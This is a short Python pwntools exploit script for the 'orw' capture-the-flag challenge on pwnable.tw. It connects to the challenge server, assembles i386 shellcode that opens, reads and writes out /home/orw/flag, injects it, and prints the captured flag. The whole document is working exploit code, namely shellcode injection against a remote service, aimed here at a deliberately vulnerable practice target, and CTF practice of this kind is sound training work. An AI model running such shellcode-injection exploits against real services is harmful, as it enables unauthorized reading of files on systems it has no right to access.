from pwn import *

DOMAIN = "chall.pwnable.tw"
PORT = 10001

# Connect into server
p = remote(DOMAIN,PORT)
context.arch = "i386"
context.log_level = "debug"

shellcode = asm(
shellcraft.i386.linux.open(b'/home/orw/flag') +
shellcraft.i386.linux.read('eax', 'esp', 50) +
    shellcraft.i386.linux.write('1', 'esp', 50)
)

p.sendafter(b':', shellcode)
flag = p.recvuntil(b'}')
p.recv()
success('Flag: %s' % flag)
p.interactive()
